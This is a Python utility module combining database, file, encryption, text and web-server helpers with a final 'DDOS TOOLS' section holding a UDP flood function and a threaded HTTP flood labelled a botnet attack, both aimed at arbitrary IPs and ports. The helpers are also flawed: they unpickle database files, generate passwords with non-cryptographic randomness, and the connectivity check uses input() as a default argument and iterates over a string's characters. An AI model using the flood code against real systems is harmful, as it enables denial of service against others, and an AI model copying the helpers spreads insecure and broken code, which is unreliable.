import requests
import json
import random
import string
from cryptography.fernet import Fernet
from collections import Counter
import http.server
import socketserver
import os
import pickle
import socket
import threading

# === DATABASE TOOLS ===
def save(data, db_file):
    """Save data to a custom database file."""
    if os.path.exists(db_file):
        with open(db_file, 'rb') as file:
            db = pickle.load(file)
    else:
        db = {}

    db.update(data)

    with open(db_file, 'wb') as file:
        pickle.dump(db, file)
    return f"Data saved to {db_file}."

def load(db_file):
    """Load data from a custom database file."""
    if os.path.exists(db_file):
        with open(db_file, 'rb') as file:
            db = pickle.load(file)
        return db
    else:
        return f"No data found in {db_file}."

def delete(key, db_file):
    """Delete a key-value pair from a custom database file."""
    if os.path.exists(db_file):
        with open(db_file, 'rb') as file:
            db = pickle.load(file)
        if key in db:
            del db[key]
            with open(db_file, 'wb') as file:
                pickle.dump(db, file)
            return f"Key '{key}' deleted from {db_file}."
        else:
            return f"Key '{key}' not found in {db_file}."
    else:
        return f"No database found at {db_file}."

def update(key, value, db_file):
    """Update a key-value pair in a custom database file."""
    if os.path.exists(db_file):
        with open(db_file, 'rb') as file:
            db = pickle.load(file)
        if key in db:
            db[key] = value
            with open(db_file, 'wb') as file:
                pickle.dump(db, file)
            return f"Key '{key}' updated in {db_file}."
        else:
            return f"Key '{key}' not found in {db_file}."
    else:
        return f"No database found at {db_file}."


# === NETWORK TOOLS ===
def check_internet(sites=input("Enter URL of site to check: ")):
    """Check internet connection by testing multiple sites."""
    for site in sites:
        try:
            response = requests.get(site, timeout=5)
            if response.status_code == 200:
                return f"Connection available with site: {site}"
        except requests.RequestException:
            continue
    return "No internet connection with any of the provided sites."


# === FILE TOOLS ===
def write_file(filename, content):
    """Write data to a file. Supports text and JSON formats."""
    with open(filename, 'w') as f:
        if isinstance(content, dict):
            json.dump(content, f, indent=4)
        else:
            f.write(content)
    return f"Data written to {filename}."

def read_file(filename):
    """Read data from a file. Supports text and JSON formats."""
    with open(filename, 'r') as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return f.read()


# === SECURITY TOOLS ===
def generate_password(length=12):
    """Generate a random strong password."""
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

def encrypt_data(data):
    """Encrypt data using Fernet encryption."""
    key = Fernet.generate_key()
    cipher = Fernet(key)
    encrypted_data = cipher.encrypt(data.encode())
    return encrypted_data, key

def decrypt_data(encrypted_data, key):
    """Decrypt encrypted data using Fernet."""
    cipher = Fernet(key)
    decrypted_data = cipher.decrypt(encrypted_data).decode()
    return decrypted_data


# === TEXT TOOLS ===
def analyze_text(text):
    """Analyze text: word count, character count, and word frequency."""
    words = text.split()
    char_count = len(text)
    word_count = len(words)
    word_frequency = dict(Counter(words))
    return {'word_count': word_count, 'char_count': char_count, 'word_frequency': word_frequency}

def extract_keywords(text, top_n=5):
    """Extract the top N most frequent keywords from the text."""
    words = text.split()
    word_count = Counter(words)
    return word_count.most_common(top_n)


# === WEB TOOLS ===
class App:
    def __init__(self, host="127.0.0.1", port=8080):
        self.routes = {}
        self.host = host
        self.port = port
    
    def route(self, path):
        """ Define a route for the application. """
        def decorator(func):
            self.routes[path] = func
            return func
        return decorator
    
    def get_html_file(self, filename="index.html"):
        """ Serve the HTML file. """
        if os.path.exists(filename):
            return open(filename, "rb").read()
        return b"File Not Found"
    
    def run(self):
        """ Start the HTTP server. """
        handler = self.create_request_handler()
        httpd = socketserver.TCPServer((self.host, self.port), handler)
        print(f"Server started at http://{self.host}:{self.port}")
        httpd.serve_forever()
    
    def create_request_handler(self):
        """ Create a request handler that serves the routes. """
        class RequestHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                path = self.path.strip("/")
                if path in app.routes:
                    content = app.routes[path]()
                else:
                    content = app.get_html_file()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(content)

        return RequestHandler

# Create the app instance
app = App()  # Default host and port


# === DDOS TOOLS ===
# UDP Flood Attack
def udp(target_ip, target_port, packet_size=1024, packet_count=10):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = b"X" * packet_size  # Packet size (default is 1024 bytes)
    
    for _ in range(packet_count):
        try:
            sock.sendto(message, (target_ip, target_port))
            print(f"Sent UDP packet to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error in UDP attack: {e}")

# Botnet Attack (simulated HTTP flood attack using threads)
def botnet(target_ip, target_port, layer_type, threads_count=10):
    def attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((target_ip, target_port))
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode('utf-8')
            sock.send(request)
            print(f"Botnet attack sent to {target_ip}:{target_port} ({layer_type} Layer)")
        except Exception as e:
            print(f"Error in Botnet attack: {e}")
        finally:
            sock.close()

    # Launch multiple threads to simulate a botnet attack
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
